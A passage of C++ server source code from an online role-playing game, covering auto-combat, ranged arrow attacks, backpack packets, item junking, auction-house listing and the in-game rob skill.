   {
      return false;
   }

   // If the target is too far away.
   if( nRange >= 25 )
   {
      // Stop combat.
      SetTarget( NULL );
      StopAutoCombat();		
      return false;
   }

   if( target->GetType() == U_PC )
   {
      Character *lpChar = static_cast< Character * >( target );
      Players *targetPl = reinterpret_cast< Players * >( lpChar->GetPlayer() );
      if ( targetPl == NULL )
      {	//DC for GPs
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "DC - GPs - target player object is null."
            LOG_
            StopAutoCombat();
         return false;
      }							//DC for GPs
      if( !targetPl->in_game )
      {
         StopAutoCombat();
         return false;
      }
   }

   EXHAUST exhaust = GetExhaust();

   if( autoCombatAttack.attackType == Attack::normal )
   {
      // If target isn't in PVP
      if( !GAME_RULES::InPVP( this, target ) )
      {

         CString csText = _STR( 14, GetLang() );
         TFCPacket sending;
         sending << (RQ_SIZE)RQ_ServerMessage;
         sending << (short)30;
         sending << (short)3;
         sending << csText;
         sending << (long)CL_BLUE_LIGHT;
         SendPlayerMessage( sending );

         SetTarget( NULL );
         StopAutoCombat();

         return false;
      }

      // If player is still physically exhausted.
      if( exhaust.attack > TFCMAIN::GetRound() )
      {
         return false;
      }

      // Lock target and this character.
      MultiLock( this, target );

      WorldPos targetPos = target->GetWL();
      WorldPos userPos   = GetWL();

      int xRange = abs( userPos.X - targetPos.X );
      int yRange = abs( userPos.Y - targetPos.Y );
      int reachRange = _DEFAULT_REACH_RANGE;

      bool rangedAttack = RangedAttack();
      if( rangedAttack )
      {
         reachRange = 25;
      }

      // If this is not a ranged attack, check if the current weapon is a bow.
      if( equipped[ BOW_POS ] != NULL && !rangedAttack )
      {
         _item *itemStructure = NULL;

         // Get the item structure.
         equipped[ BOW_POS ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &itemStructure );

         // If the weapon is a ranged weapon.
         if( itemStructure == NULL || itemStructure->weapon.ranged )
         {
            // Tell the user that the user cannot attack normally with a bow.
            SendSystemMessage( _STR( 7846, GetLang() ) );

            StopAutoCombat();

            Unlock();
            target->Unlock();
            return false;
         }
      }

      // If player isn't in range of target.
      if( xRange > reachRange || yRange > reachRange )
      {
         Unlock();
         target->Unlock();            
         return false;
      }

      if( !rangedAttack )
      {
         bool blockedPath = false;
         try 
         {
            // Attack.
            TFCMAIN::Attack( this, target, blockedPath );
         }
         catch(...) 
         {
            try
            {
               _LOG_DEBUG
                  LOG_CRIT_ERRORS,
                  "Crashed Character::ExecAutoCombat while calling TFCMAIN::Attack, Character %s target %s(%u) type %u.",
                  GetName( _DEFAULT_LNG ),
                  target->GetName( _DEFAULT_LNG ),
                  target->GetStaticReference(),
                  target->GetType()
                  LOG_
            }
            catch(...)
            {
            }
            _LOG_DEBUG
               LOG_DEBUG_LVL2,
               "--------------> pas bon sa...."
               LOG_
            //throw; //NMNMNMNM_pas sure pentoute....
         }
      }
      else
      {
         RangeAttack( target );
      }

      Unlock();
      target->Unlock();        

   }
   else if( autoCombatAttack.attackType == Attack::spell )
   {
      // If player is still mentally exhausted.
      if( exhaust.mental > TFCMAIN::GetRound() )
      {
         return false;
      }
      // Lock target and this character.
      MultiLock( this, target );

      // Cast spell on target.
      CastSpell( autoCombatAttack.spellID, target );

      Unlock();
      target->Unlock();
   }
   return true;
}
/******************************************************************************/
//  Packets the user backpack.
void Character::PacketBackpack(TFCPacket &sending, bool gameop)
/******************************************************************************/
{
   if( gameopContext != NULL && !gameop )
   {
      gameopContext->PacketBackpack( sending, true);
      return;
   }

   TemplateList <Unit> *lptluBackpack = GetBackpack();

   if( lptluBackpack != NULL )
   {
      lptluBackpack->Lock();
      lptluBackpack->ToHead();

      sending << (short)lptluBackpack->NbObjects();

      while( lptluBackpack->QueryNext() )
      {
         Objects *lpuObject = static_cast< Objects * >( lptluBackpack->Object() );
         sending << (short)lpuObject->GetAppearance();
         sending << (long) lpuObject->GetID();
         sending << (short)lpuObject->GetStaticReference();
         sending << (long) lpuObject->GetQty();
 
		 

         // Only unique items may have charges.
         if( lpuObject->IsUnique() )
		 {
            sending << (long)lpuObject->ViewFlag( __FLAG_CHARGES );
         }
         else
         {
            sending << (long)0;
         }

		 if(1)
		 {
			 BYTE chTarget = TARGET_SELF; //by default self
			 BYTE chAttack = 0;
			 BYTE chPVP    = 0;

			 // Get the item structure.
			 _item *lpItemStructure = NULL;
			 lpuObject->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItemStructure );

			 if(lpItemStructure->tlSpells.NbObjects() >1)
			 {
				 chTarget = TARGET_SELF; // self if more than 1 spell on items
			 }
			 else
			 {
				 LPOBJECT_SPELL lpSpell;
				 lpItemStructure->tlSpells.Lock();
				 lpItemStructure->tlSpells.ToHead();
				 while( lpItemStructure->tlSpells.QueryNext() )
				 {
					 lpSpell = lpItemStructure->tlSpells.Object();


					 LPSPELL_STRUCT lpSpellS = SpellMessageHandler::GetSpell( lpSpell->wSpellID );
					 if(lpSpellS != NULL)
					 {
						chTarget = lpSpellS->bTarget;
						chAttack = lpSpellS->attackSpell?1:0;
						chPVP    = lpSpellS->boPVPcheck?1:0;

					 }
				 }
				 lpItemStructure->tlSpells.Unlock();
			 }

			 sending << (char)chTarget;
			 sending << (char)chAttack;
			 sending << (char)chPVP;
		 }


		 
      }
      lptluBackpack->Unlock();
   }
   else
   {
      sending << (short)0;
   }

   // If ANY backpack update occur, remove the robbing flag.
   RemoveFlag( __FLAG_ROBBING );
}
/******************************************************************************/
//  Packets the robber's backpack.
void Character::PacketRobBackpack(Unit *robber, TFCPacket &sending)
/******************************************************************************/
{
   TemplateList <Unit> *lptluBackpack = GetBackpack();

   if( lptluBackpack != NULL ){
      lptluBackpack->Lock();
      lptluBackpack->ToHead();

      sending << (short)lptluBackpack->NbObjects();

      while( lptluBackpack->QueryNext() )
      {
         Objects *lpuObject = static_cast< Objects * >( lptluBackpack->Object() );
         sending << (short)lpuObject->GetAppearance();
         sending << (long) lpuObject->GetID();
         sending << (short)lpuObject->GetStaticReference();
         sending << (long) lpuObject->GetQty();
         sending << lpuObject->GetName( robber->GetLang() );
      }
      lptluBackpack->Unlock();
   }
   else
   {
      sending << (short)0;
   }
}
/******************************************************************************/
//  Junks a list of items
void Character::JunkItems(
                          DWORD id,  // ID if item stack to junk from.
                          DWORD qty, // Quantity of items to junk from the stack.
                          bool gameop
                          )
                          /******************************************************************************/
{
   if( gameopContext != NULL && !gameop )
   {
      gameopContext->JunkItems( id, qty, true );
      return;
   }

   CAutoLock autoLock( backpack );

   bool junked = false;
   bool updateGold = false;
   DWORD newGold = 0;
   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      Objects *u = static_cast< Objects * >( backpack->Object() );
      if( u->GetID() == id )
      {
         _item *item = NULL;

         // Get the item structure.
         u->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &item );

         // If the item can be junked.
         if( item != NULL && (!( item->dwDropFlags & CANNOT_JUNK_ITEM ) || gameop) )
         {
            if( u->GetStaticReference() == __OBJ_GOLD )
            {
               updateGold = true;
               if( qty < GetGold() )
               {
                  newGold = GetGold() - qty;
               }
            }

            // Get the right qty for logging purposes
            DWORD logQty;
            if (qty > u->GetQty())
            {
               logQty = u->GetQty();
            }
            else
            {
               logQty = qty;
            }
            // Get the name of the item:)
            char lpszID[ 256 ];
            Unit::GetNameFromID( u->GetStaticReference(), lpszID, U_OBJECT );

            _LOG_ITEMS
               LOG_MISC_1,
               "Player %s junked %u item %s ID( %s )",
               GetTrueName(),
               logQty,
               u->GetName( _DEFAULT_LNG ),
               lpszID
               LOG_

               u->Remove( qty );
            if( u->GetQty() == 0 )
            {                
               u->DeleteUnit();
               backpack->Remove();
            }

            junked = true;
         }
         else
         {
            TFormat format;
            SendSystemMessage(
               format(
               _STR( 7260, GetLang() ),
               u->GetName( GetLang() )
               )
               );
         }
         break;
      }
   }

   if( updateGold )
   {
      SetGold( newGold );
   }

   // If any item got junked
   if( junked )
   {
      // Send a backpack update.
      TFCPacket sending;
      sending << (RQ_SIZE)RQ_ViewBackpack2;
      sending << (char)0;
      sending << (long)GetID();
      PacketBackpack( sending );

      SendPlayerMessage( sending );
   }
}


//  Remove item to put on AH
//  return 0 if OK
//  return -1 if item not found
//  return -2 if he not have good quantity
//  return -3 if he cannot sold this items
//////////////////////////////////////////////////////////////////////////////////////////
int Character::PutItemToAH(DWORD id,DWORD qty,CString &ObjType,CString &ObjName,DWORD &dwEquipedPos, CString &MadeBy,long &lCharge)
{
   CAutoLock autoLock( backpack );

   int iOKRemoved  = -1;
   bool bUpdateGold = false;
   DWORD dwNewGold  = 0;

   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      Objects *u = static_cast< Objects * >( backpack->Object() );

      if( u->GetID() == id )
      {
         _item *item = NULL;
         u->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &item );// Get the item structure.

         // If the item can be junked.
         if( item != NULL && !( item->dwDropFlags & CANNOT_JUNK_ITEM ) && !( item->dwDropFlags & CANNOT_GET_ITEM ) && !( item->dwDropFlags & CANNOT_DROP_ITEM ) )
         {
            iOKRemoved = 0; // item found...

            if( u->GetStaticReference() == __OBJ_GOLD )
            {
               if( qty < GetGold() )
               {
                  bUpdateGold = true;
                  dwNewGold = GetGold() - qty;
               }
               else
               {
                  iOKRemoved = -2; // cannot sold this type of items...
               }
            }
            else
            {
               // Get the right qty for logging purposes
               if (qty > u->GetQty()) 
               {
                  iOKRemoved = -2; // cannot sold this type of items...
               }
            }
            if(iOKRemoved == 0)
            {
               // Get the name of the item:)
               char lpszID[ 256 ];
               Unit::GetNameFromID( u->GetStaticReference(), lpszID, U_OBJECT );


               ObjType.Format("%s",lpszID);
               ObjName.Format("%s",u->GetName( _DEFAULT_LNG ));
               MadeBy .Format("%s", u->GetCreatedBy());
               dwEquipedPos = item->equip_position;
               lCharge      = u->ViewFlag( __FLAG_CHARGES);

               u->Remove( qty );
               if( u->GetQty() == 0 )
               {                
                  u->DeleteUnit();
                  backpack->Remove();
               }
            }
         }
         else
         {
            iOKRemoved = -3; // cannot sold this type of items...
         }
         break;
      }
   }

   if( bUpdateGold )
   {
      SetGold( dwNewGold );
   }

   // If any item removed...
   if( iOKRemoved == 0 )
   {
      // Send a backpack update.
      TFCPacket sending;
      sending << (RQ_SIZE)RQ_ViewBackpack2;
      sending << (char)0;
      sending << (long)GetID();
      PacketBackpack( sending );

      SendPlayerMessage( sending );
   }

   return iOKRemoved;
}



//  Adds an object, safely, to the backpack
void Character::AddToBackpack(Objects *obj) // The object
/******************************************************************************/
{
   _item *itemStructure = NULL;

   // Get the item structure.
   obj->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &itemStructure );

   // If this is a Quiver.
   if( itemStructure != NULL && itemStructure->itemStructureId == 12 )
   {
      // First search the equipped items.
      int i;
      for( i = 0; i < EQUIP_POSITIONS; i++ )
      {
         if( equipped[ i ] == NULL )
         {
            continue;
         };
         if( equipped[ i ]->GetStaticReference() == obj->GetStaticReference() )
         {
            // Simply add the item's quantity to this item.
            static_cast< Objects * >( equipped[ i ] )->Add( obj->GetQty() );

            // Delete this item's instance (replaced by the equipped item).
            obj->DeleteUnit();

            // Exit the function
            return;
         }
      }
   }    

   backpack->Lock();
   // If the object is unique add it directly.
   bool add = true;
   if( !obj->IsUnique() )
   {
      backpack->ToHead();
      while( backpack->QueryNext() )
      {
         Objects *backpackItem = static_cast< Objects * >( backpack->Object() );

         // If an item of the same type was found.
         if( backpackItem->GetStaticReference() == obj->GetStaticReference() )
         {
            // Simply add the item's quantity to this item.
            backpackItem->Add( obj->GetQty() );

            // Delete this item's instance (replaced by the item in the backpack).
            obj->DeleteUnit();

            // Do not add the object to the backpack.
            add = false;

            break;
         }
      }
   }

   // If the object should be added to the backpack (not found or unique).
   if( add ){
      backpack->AddToTail( obj );

	  //CV_VALID virer le send de RQ_UpdateWeight le pack etais jamais envoyer...
      //TFCPacket sending;
      //sending << (RQ_SIZE)RQ_UpdateWeight;
      //sending << (long)GetWeight();
      //sending << (long)GetMaxWeight();
   }
   backpack->Unlock();
}
/******************************************************************************/
//  Synchronizes the gold stack with the current player's gold
void Character::SynchronizeGold( void )
/******************************************************************************/
{
   backpack->Lock();
   backpack->ToHead();

   bool found = false;
   while( backpack->QueryNext() )
   {
      // If gold was found.
      Objects *obj = static_cast< Objects * >( backpack->Object() );
      if( obj->GetStaticReference() == __OBJ_GOLD )
      {
         // If a stack of gold was already found.
         if( found )
         {
            // Delete this stack of gold.
            obj->DeleteUnit();
            backpack->Remove();
         }
         else
         {
            // Set its quantity equal to the quantity of gold on the player.
            obj->SetQty( GetGold() );
            found = true;
         }            
      }
   }

   // If not stack of gold was found.
   if( !found )
   {
      // Create a new one.
      Objects *obj = new Objects;
      if( obj->Create( U_OBJECT, __OBJ_GOLD ) )
      {
         obj->SetQty( GetGold() );

         backpack->AddToTail( obj );
      }
      else
      {
         obj->DeleteUnit();
      }
   }

   backpack->Unlock();
}
/******************************************************************************/
//  Returns the player's title
CString Character::GetTitle( bool getAccountName )
/******************************************************************************/
{
   if( getAccountName )
   {
      Players *pl = static_cast< Players * >( GetPlayer() );

      ASSERT( pl != NULL );
      if( pl == NULL )
      {
         return csListingTitle;
      }
      return pl->GetFullAccountName();
   }


   return csListingTitle; 
};
/******************************************************************************/
//  Sets the character's level
void Character::SetLevel( WORD dwLevel )// The new level
/******************************************************************************/
{
   Unit::SetLevel( dwLevel );

   // Update all group members to reflect the level change.
   Group *group = GetGroup();
   if( group != NULL )
   {
      vector< Character * > members;
      group->GetGroupMembers( members );

      int i;
      for( i = 0; i < members.size(); i++ )
      {
         group->SendGroupMembers( members[ i ] );
      }
   }

   TFCPacket sending;
   sending << (RQ_SIZE)RQ_LevelUp;
   sending << (short)dwLevel;
   if (dwLevel > MAX_LEVEL_XP) 
      dwLevel = MAX_LEVEL_XP-1; // sm_n64XPchart is an array of MAX_LEVEL_XP size, cant go over this index on it.
   sending << (long)(Character::sm_n64XPchart[dwLevel] >> 32);
   sending << (long)Character::sm_n64XPchart[dwLevel];
   sending << (long)GetHP();
   sending << (long)GetMaxHP();
   sending << (short)GetMana();
   sending << (short)GetMaxMana();	

   SendPlayerMessage( sending );
}
/******************************************************************************/
//  Robs the character.
void Character::Rob( DWORD objId )// The Id of the object to rob.
/******************************************************************************/
{
   DWORD dwRobID = ViewFlag( __FLAG_ROBBING );        

   if( dwRobID == 0 )
   {
      TELL_PLAYER( 25 );
      return;
   }
   WorldMap *wlWorld = TFCMAIN::GetWorld( GetWL().world );

   if( !wlWorld )
   {
      RemoveFlag( __FLAG_ROBBING );
      return;
   }

   // Get the target unit.
   Unit *target = GetTarget();
   if( target == NULL )
   {
      TELL_PLAYER( 25 );
      RemoveFlag( __FLAG_ROBBING );
      return;
   }

   // Use Rob on the target unit.
   UseSkill( __SKILL_ROB, target, (LPVOID)objId );

   RemoveFlag( __FLAG_ROBBING );
   SetTarget( NULL );
}
/******************************************************************************/
// Queries whether the player is attacking with ranged weapons.
bool Character::RangedAttack( void )
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return false;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return false;
   }


   // Requires a bow and a quiver, both equipped.
   if( equipped[ BOW_POS ] == NULL || equipped[ QUIVER_POS ] == NULL )
   {
      return false;
   }
   _item *itemStructure = NULL;

   // Get the item structure.
   equipped[ BOW_POS ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &itemStructure );

   // If this is not a ranged weapon.
   if( itemStructure == NULL || !itemStructure->weapon.ranged )
   {
      return false;
   }

   // Get the item structure.
   equipped[ QUIVER_POS ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &itemStructure );

   // If this is not a quiver.
   if( itemStructure == NULL || itemStructure->itemStructureId != 12 )
   {
      return false;
   }

   return true;
}
/******************************************************************************/
// Gets the hit test of an arrow shot at the given target.
void GetArrowHitTest(
                     ATTACK_STRUCTURE &blow,    // The blow structure to fill-in.
                     Character *self,           // The attacker.
                     Unit *target,              // The target.
                     _item *quiverData,         // The quiver data.
                     _item *bowData             // The bow data.
                     )
                     /******************************************************************************/
{
   blow.lDodgeSkill = target->GetDODGE();
   blow.lDodgeSkill = blow.lDodgeSkill > 0 ? blow.lDodgeSkill : 1;

   // Return if any of the two opponents are in a safe area. 
   if( GAME_RULES::InSafeHaven( self, target ) && target->GetType() == U_PC && self->GetType() == U_PC)
   {
      blow.Precision = -1;
      return;
   }

   UINT uiRet = GAME_RULES::NMPVPCanAttack( self, target );
   if( uiRet > 0 )
   {
      blow.Precision = -1;
      return;
   }

   // If the two units are in PVP
   if( !GAME_RULES::InPVP( self, target ) ){
      blow.Precision = -1;
      return;
   }


   // Calculate the range between the two players.
   int nXdiff = abs( self->GetWL().X - target->GetWL().X );
   int nYdiff = abs( self->GetWL().Y - target->GetWL().Y );
   int nRange = ::sqrt( double(nXdiff * nXdiff + nYdiff * nYdiff) );

   // Calculate damage done by the attacker.
   self->attack( &blow, target );

   // Get the damage dealt by the arrows in the quiver.
   double arrowDmg = quiverData->weapon.cDamage.GetBoost( self, target, 0, 0, nRange );

   // Deal the damage using the bow's damage, passing the arrow damage
   // as the 'x' boost parameter.
   blow.Strike += bowData->weapon.cDamage.GetBoost( self, target, arrowDmg, 0, nRange );

   // Set true strike (before AC calculation).
   blow.TrueStrike = blow.Strike;

   // Get the archery skill.
   DWORD archerySkill = 1;
   {
      LPUSER_SKILL archery = self->GetSkill( __SKILL_ARCHERY );
      if( archery != NULL ){
         archerySkill = archery->GetSkillPnts( self );
      }
   }

   archerySkill = archerySkill > 0 ? archerySkill : 1;

   blow.lAttackSkill = archerySkill;

   // Set the blow's precision.
   blow.Precision = GAME_RULES::GetBlowPrecision( 
      archerySkill, 
      blow.lDodgeSkill,
      self->GetAGI(),
      target->GetAGI()
      );
}
/******************************************************************************/
// Broadcasts an arrow-type packet.
void BroadcastArrow(
                    TFCPacket &sending,    // The packet.
                    WorldPos fromPos,      // The from position of the arrow.
                    WorldPos toPos         // The to position of the arrow.
                    )
                    /******************************************************************************/
{
   // Calculate the broadcasting range.
   WorldPos midPos = { 0, 0, fromPos.world };    

   int xDiff = fromPos.X - toPos.X;
   int yDiff = fromPos.Y - toPos.Y;

   midPos.X = xDiff / 2 + toPos.X;
   midPos.Y = yDiff / 2 + toPos.Y;

   // Add the distance between the mid pos and the farest unit
   // to the default broadcasting range.
   int range;
   if( xDiff > yDiff )
   {
      range = xDiff / 2 + _DEFAULT_RANGE;
   }
   else
   {
      range = yDiff / 2 + _DEFAULT_RANGE;
   }

   Broadcast::BCast( midPos, range, sending );
}
/******************************************************************************/
// Makes an arrow miss the target starting from 'self'.
void MakeArrowMiss(
                   Unit *self,            // The attacker.
                   WorldPos targetPos,    // The target position.
                   bool collision         // True if the miss was due to a collision.
                   )
                   /******************************************************************************/
{
   // Broadcast the miss.
   TFCPacket sending;
   sending << (RQ_SIZE)RQ_ArrowMiss;
   sending << (long)self->GetID();
   sending << (short)targetPos.X;
   sending << (short)targetPos.Y;
   if( collision )
   {
      sending << (char)1;
   }
   else
   {
      sending << (char)0;
   }

   BroadcastArrow( sending, self->GetWL(), targetPos );
};
/******************************************************************************/
// Deals damage done by an arrow that succesfully hit its target.
void DealArrowDamage(
                     Character *self,           // The unit attacking.
                     Unit *target,              // The arrow's target.
                     ATTACK_STRUCTURE &blow     // The blow.
                     )
                     /******************************************************************************/
{
   double preACstrike = blow.Strike;

   if( target->GetType() == U_HIVE || target->GetType() == U_OBJECT || target->GetType() == U_MINIONS){
      return;
   }

   // If target can attack
   if( target->CanAttack() )
   {
      if( target->GetType() == U_NPC )
      {
         // Force unit into fight
         target->Do( fighting );
         target->SetTarget( self );
      }
   }

   // If attack is previously hidden.
   if( self->ViewFlag( __FLAG_HIDDEN ) )
   {
      // Hit more!!! Mouahahahahha
      blow.Strike = blow.Strike * ( 149 + rnd.roll( dice( 1, 50 ) ) ) / 100;
   }

   // Dispell any invisibility on the attack.
   self->DispellInvisibility();

   // Got hit, so cannot be stun anymore
   if( target->ViewFlag( __FLAG_STUN ) )
   {
      if(theApp.dwEquilibrageSkillNewFormulaEnable == 0)
      {
         // Hit more !
         blow.Strike *= 15; // * 1.5, in integers..
         blow.Strike /= 10;
      }
      else
      {
         // Hit more !
         blow.Strike *= 15; // * 1.5, in integers..
         blow.Strike /= 10;
      }

      // Removes the stun timer possibily associated with it					
      target->RemoveFlag(__FLAG_STUN);
   }

   // Tell attacker that the attack hit!
   self->attack_hit( &blow, target );

   // Target is move-frozen for 500 ms.
   //target->DealExhaust( 0, 0, 500 );

   // Tell target that it is being attacked.
   target->attacked( &blow, self );

   if(blow.Strike < 0)
   {
      blow.Strike = 0;
   }

   double postACstrike = blow.Strike;// Save POST-AC strike value

   // Proccess triggered skills and god flags and get final damage value.
   // Hit the target with the blow!
   int result = target->hit( &blow, self );

   // GameOp stuff
   if( self->GetType() == U_PC )
   {
      Players *lpPlayer = static_cast< Character *>( self )->GetPlayer();
      if( lpPlayer != NULL )
      {
         if( lpPlayer->GetGodFlags() & GOD_DEVELOPPER )
         {
            TFormat format;
            self->SendSystemMessage(
               format(
               "Attack hits %s for %.2f damages (%.2f post-AC damages, %.2f final damage, %.2f true damage).",
               (LPCTSTR)target->GetName(_DEFAULT_LNG),
               preACstrike,
               postACstrike,
               blow.Strike,
               blow.TrueStrike
               )
               );
         }
         lpPlayer->m_DPSCounter +=(int)blow.Strike;                  
         if((int)blow.Strike >0 && theApp.dwSendDamageHealingSystem == 1)
         {
            DWORD color = CL_HEAL_DAMAGE_1;
            CString strDamage;
            strDamage.Format("-%d",(int)blow.Strike);
            TFCPacket sending;
            sending << (RQ_SIZE)RQ_DamageUnit;
            sending << (long)target->GetID();
            sending << strDamage;
            sending << (long)color;
            lpPlayer->self->SendPlayerMessage( sending );
        	}
      }
   }
   if( target->GetType() == U_PC)
   {
      Players *lpPlayer = static_cast< Character *>( target )->GetPlayer();
      if( lpPlayer != NULL )
      {
         if( lpPlayer->GetGodFlags() & GOD_DEVELOPPER )
         {
            TFormat format;
            target->SendSystemMessage(
               format(
               "You were hit by %s for %.2f damages (%.2f post-AC damages, %.2f final damage).",
               (LPCTSTR)self->GetName(_DEFAULT_LNG),
               preACstrike,
               postACstrike,
               blow.Strike
               )
               );
         }

         if((int)blow.Strike >0 && theApp.dwSendDamageHealingSystem == 1)
         {
            DWORD color = CL_HEAL_DAMAGE_2;
            CString strDamage;
            strDamage.Format("-%d",(int)blow.Strike);
            TFCPacket sending;
            sending << (RQ_SIZE)RQ_DamageUnit;
            sending << (long)target->GetID();
            sending << strDamage;
            sending << (long)color;
            target->SendPlayerMessage( sending );
         }
      }
   }

   // Broadcast the attack.
   TFCPacket sending;
   sending << (RQ_SIZE)RQ_ArrowHit;
   sending << (long)self->GetID();
   sending << (long)target->GetID();
   sending << (char)( target->GetHP() * 100 / target->GetMaxHP() );

   BroadcastArrow( sending, self->GetWL(), target->GetWL() );

   // If the unit got killed.
   if( result == -1 )
   {
      Broadcast::BCObjectChanged( target->GetWL(), _DEFAULT_RANGE_CHANGE, 
         target->GetCorpse(),
         target->GetID(),1,
         self->GetInvisibleQuery()
         );
   }
};
/******************************************************************************/
// Attacks a target using a ranged weapon.
void Character::RangeAttack( Unit *target )// The target of the attack.
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return ;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return ;
   }


   // If the player doesn't have a ranged weapon and quiver equipped.
   if( !RangedAttack() )
   {
      return;
   }

   // If the players are in a safe haven.
   if( GAME_RULES::InSafeHaven( this, target ) )
   {
      StopAutoCombat();

      // Notify the attacker.
      TFCPacket sending;
      sending << (RQ_SIZE)RQ_ServerMessage;
      sending << (short)30;
      sending << (short)3;
      CString csText = _STR( 22, GetLang() );
      sending << csText;   
      sending << (long)CL_BLUE_LIGHT;
      SendPlayerMessage( sending );
      return;
   }

   UINT uiRet = GAME_RULES::NMPVPCanAttack( this, target );
   if( uiRet > 0 )
   {
      if(uiRet == 1)
         this->SendInfoMessage(_STR( 15037, GetLang() ),0x0570D5);
      else if(uiRet == 2)
         this->SendInfoMessage(_STR( 15038, GetLang() ),0x0570D5);
      else if(uiRet == 3)
         this->SendInfoMessage(_STR( 15039, GetLang() ),0x0570D5);
      else if(uiRet == 98)
         this->SendInfoMessage(_STR( 15040, GetLang() ),0x0570D5);
      else if(uiRet == 99)
         this->SendInfoMessage(_STR( 15345, GetLang() ),0x0570D5);
      else if(uiRet == 1000)
         this->SendInfoMessage(_STR( 15511, GetLang() ),0x0570D5);
      else 
         this->SendInfoMessage(_STR( 15041, GetLang() ),0x0570D5);
      return;
   }

   // Cannot attack while stunned.
   if( ViewFlag( __FLAG_STUN ) != 0 )
   {
      return;               
   }    

   // Get the weapon and quiver.
   Objects *weapon = static_cast< Objects * >( equipped[ BOW_POS ] );
   Objects *quiver = static_cast< Objects * >( equipped[ QUIVER_POS ] );

   _item *weaponData = NULL;
   _item *quiverData = NULL;

   // Get the item structures.
   weapon->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &weaponData );
   quiver->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &quiverData );

   WorldMap *wl = TFCMAIN::GetWorld( GetWL().world );

   // If any of the structures couldn't be fetched.
   if( weaponData == NULL || quiverData == NULL || wl == NULL )
   {
      return;
   }

   WorldPos thisPos = GetWL();
   WorldPos targetPos = target->GetWL();
   WorldPos foundPos;
   Unit *foundUnit;

   AutoArrowRemove autoArrowRemove( this, quiver, quiverData );

   const int Limit = 10;
   int i;    
   for( i = 0; i < Limit; i++ )
   {
      // Check if any unit lies between the attacker and the target.
      if( !wl->GetCollisionPos( thisPos, targetPos, &foundPos, &foundUnit ) )
      {
         foundUnit = target;
      }

      // If a unit was found.
      if( foundUnit != NULL )
      {
         // Do hit test with this unit.
         ATTACK_STRUCTURE blow;
         memset( &blow, 0, sizeof( ATTACK_STRUCTURE ) );

         GetArrowHitTest( blow, this, foundUnit, quiverData, weaponData );

         // If the blow hit the unit.
         if( blow.Precision > 0 || foundUnit->ViewFlag( __FLAG_STUN ) != 0 )
         {
            // Deal a minimum of 500ms move and attack exhaust
            DealExhaust( 500, 0, 1000 );

            // Deal arrow blow.
            DealArrowDamage( this, foundUnit, blow );
            return;
         }
         else
         {
            // If the missed unit is the target
            if( foundUnit == target )
            {
               // Deal a minimum of 500ms move and attack exhaust
               DealExhaust( 500, 0, 1000 );

               // Make the arrow miss.
               MakeArrowMiss( this, target->GetWL(), false );
               return;
            }

            // Continue, using the found unit as the new position.
            thisPos = foundUnit->GetWL();
         }
      }
      else
      {
         // Deal a minimum of 500ms move and attack exhaust
         DealExhaust( 500, 0, 1000 );
         // Then deal the weapon's exhaust
         DealExhaust( weaponData->weapon.cDealtExhaust.GetBoost( this ), 0, 0 );

         Players *pl = reinterpret_cast< Players * >( GetPlayer() );
         if( pl->GetGodFlags() & GOD_DEVELOPPER )
         {
            SendSystemMessage( "Arrow hit something which is not a unit." );
         }
         // If the quiver doesn't have infinite ammo
         if( !quiverData->weapon.infiniteAmmo )
         {
            // Make auto-combat stop to avoid spending ammo.
            StopAutoCombat();
         }

         // Make the arrow miss
         MakeArrowMiss( this, foundPos, true );
         return;
      }
   }

   // The arrow tried too many times, make it miss.
   MakeArrowMiss( this, target->GetWL(), false );
}

/*
void Character::SetTarget(Unit *newTarget)
{

   Unit::SetTarget(newTarget);
}
*/
/******************************************************************************/
// Returns how many of the provided item is equipped by the character.
DWORD Character::EquipCount( WORD itemId )// The item to search for.
/******************************************************************************/
{
   int i;
   for( i = 0; i < EQUIP_POSITIONS; i++ )
   {
      if( equipped[ i ] == NULL )
      {
         continue;
      }
      if( equipped[ i ]->GetStaticReference() == itemId )
      {
         return static_cast< Objects * >( equipped[ i ] )->GetQty();
      }
   }
   return 0;
}

DWORD Character::BackCount( WORD itemId )
{
   CAutoLock autoLock( backpack );
   backpack->Lock();
   backpack->ToHead();
   int iNbrObj = 0;
   while( backpack->QueryNext() )
   {
      Objects *obj = static_cast<Objects*>(backpack->Object());
      if (obj->GetStaticReference() == itemId) 
      {
         iNbrObj += obj->GetQty();
      }
   }
   backpack->Unlock();
   return iNbrObj;
}

void Character::BackRemove( WORD itemId ,int iQty)
{
   CAutoLock autoLock( backpack );

   backpack->Lock();
   backpack->ToHead();
   int iNbrObj = 0;
   while( backpack->QueryNext() )
   {
      Objects *obj = static_cast<Objects*>(backpack->Object());
      if (obj->GetStaticReference() == itemId) 
      {
         obj->Remove( iQty );
         if( obj->GetQty() == 0 )
         {                
            obj->DeleteUnit();
            backpack->Remove();
         }

         backpack->Unlock();
         return;
      }

   }
   backpack->Unlock();
}

/******************************************************************************/
// Clears all skills and spells and skill points and stat points.
void Character::ClearAllSkillsAndSpells( void )
/******************************************************************************/
{
   TemplateList <USER_SKILL> tlDeletedSkills;
   BOOL boFound;

   int i;
   for( i = 0; i < NB_SKILL_HOOKS; i++ )
   {
      tlusSkills[ i ].ToHead();
      // Pass all the skills in the hook
      while( tlusSkills[ i ].QueryNext() )
      {
         // Check if pointer has already been deleted
